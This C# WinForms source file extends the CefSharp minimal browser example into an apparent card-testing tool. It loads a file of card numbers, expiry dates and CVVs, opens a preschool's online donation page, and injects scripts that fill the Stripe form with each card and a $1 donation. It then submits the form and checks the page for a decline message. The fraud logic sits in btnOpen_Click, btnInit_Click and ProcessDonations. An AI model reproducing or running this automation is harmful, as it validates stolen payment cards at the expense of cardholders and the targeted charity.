// Copyright © 2010-2015 The CefSharp Authors. All rights reserved.
//
// Use of this source code is governed by a BSD-style license that can be found in the LICENSE file.

using System;
using System.Data;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Media;
using System.Xml;
using CefSharp.MinimalExample.WinForms.Controls;
using CefSharp.WinForms;
using Color = System.Drawing.Color;

namespace CefSharp.MinimalExample.WinForms
{
    public partial class BrowserForm : Form
    {
        private readonly ChromiumWebBrowser browser;
        private bool ready;

        public BrowserForm()
        {
            InitializeComponent();

            Text = "CefSharp";
            WindowState = FormWindowState.Maximized;

            browser = new ChromiumWebBrowser("about:blank")
            {
                Dock = DockStyle.Fill,
            };
            toolStripContainer.ContentPanel.Controls.Add(browser);

            browser.LoadingStateChanged += OnLoadingStateChanged;
            browser.ConsoleMessage += OnBrowserConsoleMessage;
            browser.StatusMessage += OnBrowserStatusMessage;
            browser.TitleChanged += OnBrowserTitleChanged;
            browser.AddressChanged += OnBrowserAddressChanged;
            browser.FrameLoadEnd += OnFrameLoadEnded; 

            var bitness = Environment.Is64BitProcess ? "x64" : "x86";
            var version = String.Format("Chromium: {0}, CEF: {1}, CefSharp: {2}, Environment: {3}", Cef.ChromiumVersion, Cef.CefVersion, Cef.CefSharpVersion, bitness);
            DisplayOutput(version);
        }

        private void OnFrameLoadEnded(object sender, FrameLoadEndEventArgs e)
        {
            ready = e.Frame.IsMain;
        }

        private void OnBrowserConsoleMessage(object sender, ConsoleMessageEventArgs args)
        {
            DisplayOutput(string.Format("Line: {0}, Source: {1}, Message: {2}", args.Line, args.Source, args.Message));
        }

        private void OnBrowserStatusMessage(object sender, StatusMessageEventArgs args)
        {
            this.InvokeOnUiThreadIfRequired(() => statusLabel.Text = args.Value);
        }

        private void OnLoadingStateChanged(object sender, LoadingStateChangedEventArgs args)
        {
            SetCanGoBack(args.CanGoBack);
            SetCanGoForward(args.CanGoForward);

            this.InvokeOnUiThreadIfRequired(() => SetIsLoading(!args.CanReload));
        }

        private void OnBrowserTitleChanged(object sender, TitleChangedEventArgs args)
        {
            this.InvokeOnUiThreadIfRequired(() => Text = args.Title);
        }

        private void OnBrowserAddressChanged(object sender, AddressChangedEventArgs args)
        {
            this.InvokeOnUiThreadIfRequired(() => urlTextBox.Text = args.Address);
        }

        private void SetCanGoBack(bool canGoBack)
        {
            this.InvokeOnUiThreadIfRequired(() => backButton.Enabled = canGoBack);
        }

        private void SetCanGoForward(bool canGoForward)
        {
            this.InvokeOnUiThreadIfRequired(() => forwardButton.Enabled = canGoForward);
        }

        private void SetIsLoading(bool isLoading)
        {
            goButton.Text = isLoading ?
                "Stop" :
                "Go";
            goButton.Image = isLoading ?
                Properties.Resources.nav_plain_red :
                Properties.Resources.nav_plain_green;

            ready = !isLoading;
            HandleToolStripLayout();
        }

        public void DisplayOutput(string output)
        {
            this.InvokeOnUiThreadIfRequired(() => outputLabel.Text = output);
        }

        private void HandleToolStripLayout(object sender, LayoutEventArgs e)
        {
            HandleToolStripLayout();
        }

        private void HandleToolStripLayout()
        {
            var width = toolStrip1.Width;
            foreach (ToolStripItem item in toolStrip1.Items)
            {
                if (item != urlTextBox)
                {
                    width -= item.Width - item.Margin.Horizontal;
                }
            }
            urlTextBox.Width = Math.Max(0, width - urlTextBox.Margin.Horizontal - 18);
        }

        private void ExitMenuItemClick(object sender, EventArgs e)
        {
            browser.Dispose();
            Cef.Shutdown();
            Close();
        }

        private void GoButtonClick(object sender, EventArgs e)
        {
            LoadUrl(urlTextBox.Text);
        }

        private void BackButtonClick(object sender, EventArgs e)
        {
            browser.Back();
        }

        private void ForwardButtonClick(object sender, EventArgs e)
        {
            browser.Forward();
        }

        private void UrlTextBoxKeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Enter)
            {
                return;
            }

            LoadUrl(urlTextBox.Text);
        }

        private void LoadUrl(string url)
        {
            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                browser.Load(url);
            }
        }

        private void btnOpen_Click(object sender, EventArgs e)
        {
            openFileDialog.ShowDialog();
            var filename = openFileDialog.FileName;
            
            try
            {
                var data = new DataTable();
                
                lblStatus.Text = "Tarjetas cargadas...";
                lblStatus.ForeColor = Color.Red;

                data.Columns.Add("CC");
                data.Columns.Add("MES");                
                data.Columns.Add("AÑO");
                data.Columns.Add("CVV");

                //dr = datagrid.NewRow()
                var separator = '|';
                var file = new StreamReader(filename);
                while (file.Peek() != -1)
                {
                    data.Rows.Add(file.ReadLine().Split(separator));
                }
                dgwDataCard.DataSource = data;
                dgwDataCard.CurrentRow.Selected = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                throw;
            }
                                
            //'lblContador.Text = Convert.ToString(DataGridView1.Rows.Count - 1)            

            for (int i = 0; i < dgwDataCard.ColumnCount - 1; i++)
            {
                dgwDataCard.Columns[i].AutoSizeMode = i == dgwDataCard.ColumnCount -1 
                    ? DataGridViewAutoSizeColumnMode.Fill 
                    : DataGridViewAutoSizeColumnMode.DisplayedCells;
            }
            
        }

        private void btnInit_Click(object sender, EventArgs e)
        {
            lblStatus.Text = "Autorizando donaciones...";
            lblStatus.ForeColor = Color.Yellow;            
            
            foreach (DataGridViewRow row in dgwDataCard.Rows)
            {
                if (row.Index != dgwDataCard.Rows.Count - 1 && row.Index >= 0)
                {
                    browser.Load("about:blanck");
                    ready = false;
                    browser.Load("https://druidhillspreschool.org/relocate/index.php");

                    while (!ready)
                    {
                        Console.WriteLine("No ready!");
                    }
                    ProcessDonations(row.Index);
                }                    
            }
            browser.Load("about:blanck");
        }

        private void ProcessDonations(int index)
        {
            var row = dgwDataCard.Rows[index];
            lblStatus.Text = "Autorizando donaciones...#" + Convert.ToString(row.Index + 1);
            lblStatus.ForeColor = Color.Blue;
            row.DefaultCellStyle.BackColor = Color.LightSkyBlue;



            browser.EvaluateScriptAsync("document.getElementsByName('radio_amount')[5].checked=true").Wait();
            browser.EvaluateScriptAsync("document.getElementsByName('other_amount')[0].value='1'").Wait();
            browser.EvaluateScriptAsync("document.getElementsByName('name')[0].value='piero espire'").Wait();
            browser.EvaluateScriptAsync("document.getElementsByName('email')[0].value='empresadeperritos@gmail.com'").Wait();
            browser.EvaluateScriptAsync("document.getElementsByName('cardholder_name')[0].value='piero espire'").Wait();


            var carNumber = Convert.ToString(row.Cells[0].Value);
            browser.EvaluateScriptAsync($"document.querySelector('input[data-stripe=\"number\"]').value='{carNumber}'").Wait();

            var carExpireMonth = Convert.ToByte(row.Cells[1].Value).ToString();
            browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=\"exp-month\"]').value='{carExpireMonth}'").Wait();

            var carExpireYear = Convert.ToInt32(row.Cells[2].Value).ToString();
            browser.EvaluateScriptAsync($"document.querySelector('select[data-stripe=\"exp-year\"]').value='{carExpireYear}'").Wait();

            var carCvc = Convert.ToString(row.Cells[3].Value);
            browser.EvaluateScriptAsync($"document.getElementsByName('cvc')[0].value='{carCvc}'").Wait();

            
            browser.EvaluateScriptAsync($"document.getElementsByTagName('button')[0].click()").Wait();

            var gogo = false;
            while (!gogo)
            {                
                browser.GetSourceAsync().ContinueWith(taskHtml =>
                {
                    string html = taskHtml.Result;
                    var contain = html.Contains(@"<h2>Oh Snap!</h2>");

                    if (contain)
                    {
                        gogo = true;
                    }
                }).Wait();
                if (gogo)
                {
                    Console.Write("sigue");
                }
                else
                {
                    Console.Write("sigue NO");
                }
            }
            ////ContinueWith(
            //    //Sub(x)
            //'    If x.IsCompleted Then
            //'        canReadResult = True
            //'    End If
            //'End Sub)
            //Thread.Sleep(20000);
        }
    }
}
